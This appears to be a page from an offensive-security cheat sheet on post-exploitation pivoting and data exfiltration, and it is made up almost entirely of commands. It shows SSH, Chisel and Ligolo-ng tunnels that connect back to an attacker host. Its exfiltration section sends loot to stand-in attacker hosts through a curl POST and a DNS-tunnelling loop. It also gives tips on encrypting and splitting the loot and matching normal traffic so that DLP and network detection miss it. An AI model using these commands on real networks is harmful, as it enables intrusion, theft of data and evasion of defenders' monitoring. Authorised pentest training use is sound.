---
tags:
  - Privesc
  - Network
---

# :material-transit-connection-variant: Pivoting & Exfiltration

<span class="pill pill-medium">post-ex</span> <span class="pill pill-info">network</span>

A compromised host is a doorway into networks you can't reach directly. Pivoting = routing your tools *through* that host; exfil = getting loot out without tripping alarms.

!!! abstract "TL;DR"
    Use SSH forwards or a SOCKS proxy (Chisel/Ligolo-ng) to reach internal subnets, then `proxychains` your normal tools through it. Exfil over already-allowed channels (HTTPS/DNS) and encrypt.

## :material-lan: Discover the internal reach

```bash
# From the foothold, what else can it see?
ip a; ip route; cat /etc/hosts; arp -a
for i in $(seq 1 254); do (ping -c1 -W1 10.10.20.$i >/dev/null && echo 10.10.20.$i up &); done
# Windows
ipconfig /all & route print & arp -a
```

## :material-swap-horizontal: SSH tunneling

```bash
# Local forward: reach an internal service on your box
ssh -L 8080:10.10.20.5:80 user@pivot        # localhost:8080 -> internal:80
# Remote forward: expose your box to the internal host
ssh -R 9001:127.0.0.1:9001 user@pivot
# Dynamic (SOCKS proxy) — the flexible one
ssh -D 1080 user@pivot
```

Then route tools through the SOCKS proxy:

```bash
# /etc/proxychains4.conf ->  socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.20.5
proxychains nxc smb 10.10.20.0/24
```

## :material-tunnel: Chisel & Ligolo-ng

<span class="pill pill-easy">when there's no SSH</span>

=== "Chisel (reverse SOCKS)"

    ```bash
    # Attacker (server)
    ./chisel server -p 8000 --reverse
    # Victim (client) — connects back, opens a SOCKS proxy on the server
    ./chisel client ATTACKER:8000 R:socks
    # -> proxychains through 127.0.0.1:1080
    ```

=== "Ligolo-ng (tun interface — no proxychains!)"

    ```bash
    # Attacker
    sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
    ./proxy -selfcert
    # Victim
    ./agent -connect ATTACKER:11601 -ignore-cert
    # Back on attacker console: add a route to the internal subnet
    ligolo-ng» session; ifconfig
    sudo ip route add 10.10.20.0/24 dev ligolo
    # Now use tools DIRECTLY — no proxychains, full TCP/UDP/ICMP
    ```

!!! tip "Ligolo-ng > proxychains for anything non-trivial"
    Ligolo gives you a real routed interface, so nmap SYN scans, full TCP, and tools that hate SOCKS all just work. It's the modern default for internal pivoting.

## :material-arrow-decision: Port forwarding without tunnels

```bash
# socat relay
socat TCP-LISTEN:8080,fork TCP:10.10.20.5:80
# Windows netsh portproxy
netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.10.20.5 connectport=80
# Metasploit
meterpreter> run autoroute -s 10.10.20.0/24
meterpreter> portfwd add -l 8080 -p 80 -r 10.10.20.5
```

## :material-export: Exfiltration

!!! loot "Blend into allowed traffic"
    ```bash
    # HTTPS POST (looks like normal web traffic)
    curl -k -X POST https://ATTACKER/u -F 'f=@loot.tgz'
    # DNS exfil (when only DNS egress is allowed) — slow but sneaky
    xxd -p loot | while read c; do dig $c.exfil.attacker.com @8.8.8.8; done
    # ICMP tunnel (ptunnel/hans) when only ping leaves
    ```

Stage and shrink first:

```bash
tar czf - /loot 2>/dev/null | openssl enc -aes-256-cbc -pbkdf2 -salt -out loot.enc
# Split large files to avoid size-based DLP alerts
split -b 5M loot.enc part_
```

!!! opsec "Exfil is what DLP and NDR hunt for"
    Large outbound transfers, DNS tunneling, and unusual destinations light up detection. Match volume and timing to normal traffic, prefer already-permitted ports/protocols, and always encrypt so intercepted loot is useless.

## :material-tune: Ligolo-ng tuning & gotchas

The proxy prints a **certificate fingerprint** on start — pin it from the agent instead of `-ignore-cert` for a cleaner setup, and it lets the agent connect back through anything that carries TCP (including an ngrok relay when the target can't reach you directly):

```bash
# Attacker: note the fingerprint from the proxy banner
./proxy -selfcert
#   INFO TLS Certificate fingerprint for ligolo is: D005527D...E0FC

# Victim: pin it explicitly
./agent -connect ATTACKER:11601 -v -accept-fingerprint D005527D...E0FC
# ...or pivot out through an ngrok TCP tunnel when there's no direct route home
./agent -connect 4.tcp.eu.ngrok.io:19013 -v -accept-fingerprint <FP>
```

!!! bug "Tunnel freezes or route won't take"
    - **Freezing / stalled transfers** — the tun MTU is too high. Drop it:
      `sudo ip link set dev ligolo mtu 1000`.
    - **Route not actually going through ligolo** — verify with
      `ip route get 10.0.1.30`; it *must* say `dev ligolo`. If it still shows your
      Wi-Fi, `sudo ip route del 10.0.1.0/24` and re-add it.
    - **Confirm an internal port is reachable** before firing tools:
      `nc -zv -w 5 10.0.12.221 5432`.

## :material-link-variant: Related

- Enables reaching a second [Active Directory](../network/active-directory.md) tier or new subnets from [Recon](../network/recon.md).
- Pairs with [Persistence](persistence.md) to maintain the tunnel.
- Reference: [Ligolo-ng](https://github.com/nicocha30/ligolo-ng), [Chisel](https://github.com/jpillora/chisel), [MITRE ATT&CK Exfiltration](https://attack.mitre.org/tactics/TA0010/).
